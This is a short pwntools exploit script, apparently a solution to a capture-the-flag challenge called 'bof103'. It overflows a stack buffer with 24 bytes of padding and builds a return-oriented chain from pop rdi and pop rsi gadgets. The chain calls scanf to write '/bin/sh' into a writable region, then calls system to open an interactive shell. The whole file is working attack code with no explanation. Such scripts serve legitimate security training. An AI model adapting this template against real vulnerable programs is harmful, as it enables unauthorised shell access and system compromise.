from pwn import *

#r = remote("bof103.sstf.site",1337)
r = process("./bof103")
e = ELF("./bof103")
pop_rdi = 0x00000000004007b3            # pop rdi; ret
pop_rsi = 0x0000000000400747            # pop rsi; rst
ret = 0x0000000000400529                # ret
data = 0x601100                         # writtable region 
format_string = 0x4007ee                # address of "%s" format string
exploit = b"A" * 24 + p64(pop_rdi) + p64(format_string) + p64(pop_rsi) + p64(data) + p64(ret) + p64(e.plt.__isoc99_scanf)
exploit += p64(pop_rdi) + p64(data) + p64(ret) + p64(e.plt.system)
r.sendlineafter("Name > ",exploit)
r.sendline(b"/bin/sh\x00")
r.interactive()
